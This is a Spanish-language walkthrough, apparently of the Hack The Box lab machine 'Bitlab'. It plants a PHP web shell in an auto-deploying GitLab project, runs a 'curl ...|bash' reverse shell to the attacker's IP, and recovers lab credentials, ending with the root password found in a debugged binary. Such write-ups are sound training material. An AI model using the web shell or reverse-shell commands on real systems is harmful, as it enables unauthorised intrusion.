---
layout: post
title: HTB_Bitlab
date: 2023/07/10
slug: HTB_Bitlab
heroImage: /assets/machines.jpg
---

# Bitlab {-}

## Introduccion {-}

La maquina del dia se llama Bitlab.

El replay del live se puede ver aqui

[![S4vitaar Bitlab maquina](https://img.youtube.com/vi/sZFrgbRjOfg/0.jpg)](https://www.youtube.com/watch?v=sZFrgbRjOfg)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.114
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.114
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.114 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.114 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 22     | tcp      | Conneccion directa | creds      |
| 80     | tcp      | Web, Fuzzing       |            |

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.114
```

Hay una redirection hacia la routa 
```bash
 http://10.10.10.114/users_sign_in 
```
 y vemos un Cookie 
```bash
 _gitlab_session 
```
.
Vemos que esta hosteada sobre un NGINX. 


#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.114 
```
, Vemos la pagina de inicio de session de Gitlab pero no podemos registrarnos. Solo nos podemos loggear.
Intentamos con loggins por defecto pero no llegamos a conectarnos.
Como la enumeracion con **NMAP** nos a mostrado un 
```bash
 robots.txt 
```
, miramos lo que hay por esta routa. Vemos una serie de routas ocultadas. Intentamos ver unas
cuantas y la unica que nos muestra algo interesante es la routa 
```bash
 http://10.10.10.114/help 
```
 donde vemos un fichero 
```bash
 bookmark.html 
```
.

Hay una serie de links y haciendo *Hovering* vemos que el link Gitlab Login nos sale un script un javascript. Analyzando el codigo fuente, vemos una declaracion
de variable en hexadecimal. La copiamos y la decodificamos para ver lo que es.

```bash
echo "var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64
&quot;,&quot;\x63\x6C\x61\x76\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;]" | sed s/\&quot/\'/g
#Output
var _0x4b18=[';value';,';user_login';,';getElementById';,';clave';,';user_password';,';11des0081x';]
```

Como tenemos un usuario y una contraseña nos connectamos al panel de inicio.

## Vulnerability Assessment {-}


### Gitlab {-}

Como hemos podido connectarnos, analyzamos el contenido del gitlab. 
Vemos que hay 2 repositorios. En el menu Activity vemos cosas interessante como una especie de **CI/CD** que permite
tras una merge request updatear el proyecto *Profile* automaticamente. Ademas la routa 
```bash
 /profile 
```
 estaba ocultada por el
**robots.txt**.

En el menu Snippets vemos un codigo php

```php
<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");
```

#### Subimos un archivo php que nos permite ejecutar comandos {-}

Creamos un archivo 
```bash
 s4vishell.php 
```
 en el proyecto profile.

```php
<?php
    echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>';
?>
```

Hacemos un commit con este fichero y se nos crea una rama diferente de la **master** lo que significa que tenemos que crear una **Merge request**.
Una vez esta **Merge Request** creada, Vemos que la podemos acceptar sin problemas porque el proyecto nos apartenece.

Si vamos a la url 
```bash
 http://10.10.10.114/profile/s4vishell.php?cmd=whoami 
```
 Vemos que tenemos possibilidad de ejecutar comandos a nivel de systema.
## Vuln exploit & Gaining Access {-}

### Ganando accesso con la s4vishell.php {-}

1. Creamos un archivo index.html

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.17.51/443 0>&1
    ```

1. Creamos un servidor web con python

    ```bash
    python3 -m http.server 80
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Cambiamos la url por 
    
    ```bash
    http://10.10.10.114/profile/s4vishell.php?cmd=curl 10.10.17.51|bash
    ```

Ya hemos ganado accesso al systema.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### User Pivoting {-}

Como el **user.txt** del usuario **clave** no es permitido a nivel de lectura por el usuario **www-data** tenemos que convertirnos en el usuario
**clave**.

Aprovechamos el snippet encontrado para ver lo que hay en la base de datos **postgresql**.

```bash
which psql
which php
```

Vemos que la utilidad **psql** no existe en la maquina victima, pero como tenemos acceso a la utilidad **php**, tiramos del 
```bash
 php --interactive 
```


```bash
php --interactive

$connection = new PDO('pgsql:dbname=profiles;host=localhost', 'profiles', 'profiles');
$connect = $connection->query("select * from profiles");
$results = $connect->fetchAll();
print_r($results);
```

Aqui vemos la contraseña del usuario clave. Parece ser una contraseña en base64.

```bash
echo 'c3NoLXN0cjBuZy1wQHNz==' | base64 -d; echo
#Output
ssh-str0ng-p@ss
```

Intentamos connectarnos con ssh

```bash
ssh clave@10.10.10.114
password: ssh-str0ng-p@ss
```

No nos podemos connectar pero el doble igual nos parece un poco raro. Intentamos otra vez pero con la contraseña tal cual, sin decodificacion base64.

```bash
ssh clave@10.10.10.114
password: c3NoLXN0cjBuZy1wQHNz==
```

Ya podemos conectar y leer la flag.
## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root/
id
sudo -l
ls -l
```

No tenemos privilegios claramente definida pero un fichero no llama la atencion. Este fichero que es un 
```bash
 RemoteConnection.exe 
```
, un fichero
windows en una maquina Linux.

Nos descargamos el fichero uzando un base64

1. En la maquina victima

    ```bash
    base64 -w 0 `RemoteConnection.exe ; echo
    ```

1. Copiamos el hash y lo colamos en la maquina de atacante 

    ```bash
    bash
    echo "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..." base64 -d > RemoteConnection.exe
    ```

1. Controlamos los ficheros con md5sum y transferimos el RemoteConnection.exe a una maquina Windos que tiene el Immunity Debugger con el DEP desabilitado.
1. Lanzando el programa en la maquina Windows, vemos que nos falta una .dll, la descargamos de internet y la ponemos en la routa 
```bash
 C:\Windows\System32 
```



Ya podemos lanzar el **Immunity Debugger** como administrador

1. Abrimos el RemoteConnection.exe desde el Immunity Debugger
1. En la ventana de arriba a la izquierda, hacemos un clic derecho > Search for > AllReferenced text strings

    vemos que hay un putty que sirbe de connection a una maquina linux desde windows.

1. Encontramos una string "clave", le damos al clic derecho > Follow in Disassembler

    Aqui vemos que hay un CMP que es un compare 

1. Justo antes de esta comparativa ponemos un breakpoint para ver con que se compara exactamente
1. Le damos al boton play

En la ventana de arriba a la derecha, podemos ver los datos que se utilizan para la coneccion con el SSH del usuario root.


```bash
ssh root@10.10.10.114
password: Qf7j8YSV.wDNF*[7d?j&eD4^
```

Ya estamos conectados como root y podemos leer la flag.
